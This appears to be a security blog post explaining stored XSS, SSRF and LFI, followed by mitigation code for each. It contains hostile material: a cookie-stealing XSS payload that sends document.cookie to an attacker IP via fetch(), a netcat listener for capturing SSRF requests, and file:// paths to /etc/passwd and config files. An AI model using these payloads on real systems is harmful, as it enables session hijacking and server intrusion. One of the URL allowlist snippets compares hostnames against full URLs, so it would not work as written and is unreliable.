---
title: "Infiltrating the Digital Fortress: A Journey to the Heart of Web Vulnerabilities"
date: 2022-08-17 18:18:30
categories: [web vulnerabilities]
tags: [ssrf, lfi, xss, session hijacking]
---

Web security is a fortress constantly besieged by rapidly evolving digital threats. In this in-depth article, we explore the intricate world of web vulnerabilities through practical examples and code that illustrate how supposedly secure systems can be compromised. Let's unveil the strategies behind Cross-Site Scripting (XSS) Stored, Server-Side Request Forgery (SSRF), and Local File Inclusion (LFI) attacks.

## Dissecting a Stored XSS Attack: The Persistent Trap

A Stored XSS attack occurs when a malicious script is stored in a web application and executed every time the page is loaded. Consider a hypothetical example of script injection in a bug management system:

```html
<!-- XSS payload to capture cookies -->
<img src="undefined" onerror="fetch('http://192.168.15.10/capture?cookie='+document.cookie)">
```

This simple piece of code, when inserted through a vulnerable input, can capture session cookies from any user who views the reported bug, allowing access to protected sessions.

## Depths of SSRF: Exposing Internal Systems

SSRF allows an attacker to make the server perform requests to specific domains, often exposing internal services. Imagine a scenario where a development server attempts to access a PDF generation service but is tricked into connecting to a malicious host:

```bash
# Setting up a listener to capture requests
nc -nlvp 5555
```

```plaintext
# Requesting the server to access the malicious service
http://192.168.15.11:5555
```

By doing this, sensitive information such as HTTP headers and potentially authenticated data can be captured by the attacker.

## LFI Vulnerability: Espionage of Files

The LFI vulnerability is an entry point for spying on or executing local files on the server. Using this flaw, an attacker can view critical files or execute scripts indirectly:

```plaintext
# Accessing the system's password file
file:///etc/passwd

# Obtaining web server configuration information
file:///etc/nginx/nginx.conf

# Viewing configuration scripts
file:///home/user/setup.sh
```

This method of exploitation provides a detailed view of the server environment, enabling more targeted and sophisticated attacks.

# Exploiting SSRF to Access Internal FTP Servers

In a hypothetical web application with an SSRF vulnerability, an attacker can manipulate the application to access internal resources, like an FTP server. With revised credentials, the attacker constructs a new URL:

```plaintext
ftp://new_user:new_password@ftp.internal
```

In this URL:
- `new_user` is the revised username.
- `new_password` is the new password.
- `ftp.internal` is the hostname of the internal FTP server.

This approach allows the attacker to exploit the SSRF vulnerability to access the FTP server, posing serious security risks such as unauthorized access to sensitive files and potential data breaches.

## Mitigation Strategies
To safeguard against such threats:
- **Restrict URL Inputs**: Only allow URLs for safe and intended purposes by filtering out potentially harmful or unauthorized requests.
- **Enforce Secure Authentication Practices**: Ensure that internal services like FTP servers require secure authentication mechanisms and that credentials are not exposed or easily guessable.
- **Implement Network Segmentation**: Isolate sensitive internal services from public-facing systems to reduce the attack surface.


## Creativity in Code: Manipulation and Defense

The attacks described above can be dramatic, but the defenses are equally robust. For example, to mitigate XSS, developers can implement Content Security Policy (CSP):

```javascript
// Implementing CSP to prevent XSS
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://apis.example.com"]
    }
}));
```

To combat SSRF, it's possible to restrict outgoing HTTP requests only to known and secure domains:

```python
# Function to validate URLs against a whitelist
def is_url_allowed(url):
    allowed_domains = ["https://service.example.com", "https://api.example.com"]
    return any(url.startswith(domain) for domain in allowed_domains)
```

In the realm of web security, understanding the nature of vulnerabilities is crucial, but developing robust countermeasures is even more vital. This detailed guide will focus on the mitigation strategies for the specific attack vectors discussed previously: Cross-Site Scripting (XSS) Stored, Server-Side Request Forgery (SSRF), and Local File Inclusion (LFI). We will explore how to shield web applications from such vulnerabilities through practical examples.

## Mitigating Stored XSS Attacks: Secure Input Handling

Stored XSS attacks involve malicious scripts being stored on a web server, which are then executed in users' browsers. To counter this, it is essential to sanitize and validate all user inputs.

**Example Implementation:**

1. **Sanitize Input**: Use library functions to encode or strip out potentially malicious characters.
2. **Content Security Policy (CSP)**: Implement CSP to restrict sources of executable scripts and protect against XSS by defining approved sources of content.

```javascript
// Example of implementing input sanitization in Node.js using the xss library
const xss = require('xss');

let sanitizedInput = xss(userInput);

// Example of setting a Content Security Policy in HTTP headers
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "trusted-source.com"],
        blockAllMixedContent: [],
        upgradeInsecureRequests: [],
    }
}));
```

## Mitigating SSRF Attacks: Restricting Outbound Requests

SSRF attacks exploit a server to make requests to internal or external resources. Mitigating SSRF involves limiting the URL destinations that the server can request.

**Example Implementation:**

1. **Validate URLs**: Implement checks to ensure only allowed URLs are accessible.
2. **Segmentation and Firewalling**: Use network segmentation and firewall rules to restrict the server from accessing critical internal resources.

```python
# Example of URL validation to prevent SSRF in Python
def is_url_allowed(url):
    allowed_domains = ["https://api.trustedsource.com", "https://resources.safe.com"]
    parsed_url = urlparse(url)
    return parsed_url.hostname in allowed_domains

# Use this function to validate URLs before making requests
if is_url_allowed(request_url):
    response = requests.get(request_url)
else:
    raise ValueError("Invalid URL")
```

## Mitigating LFI Attacks: Secure File Handling

LFI attacks involve exploiting vulnerabilities to access files on a web server. Preventing LFI requires ensuring that file paths are securely handled and not directly exposed to user input.

**Example Implementation:**

1. **Whitelisting File Paths**: Only allow file accesses to a predefined list of safe paths.
2. **Input Validation**: Strictly validate any input that may influence file paths.

```python
# Example of securing file path access in Python
def get_safe_file_path(user_input):
    safe_paths = {'user_data': '/var/data/user_data.txt', 'config': '/var/config/site_config.txt'}
    if user_input in safe_paths:
        return safe_paths[user_input]
    else:
        raise ValueError("Requested file is not accessible.")

# Retrieve file content securely
file_path = get_safe_file_path(requested_file)
with open(file_path, 'r') as file:
    file_content = file.read()
```

## Conclusion: Proactive Defense Strategies

By implementing these mitigation strategies, developers can significantly enhance the security of their web applications. The key is proactive defense—anticipating potential attack vectors and countering them with thoughtful, well-implemented security practices.

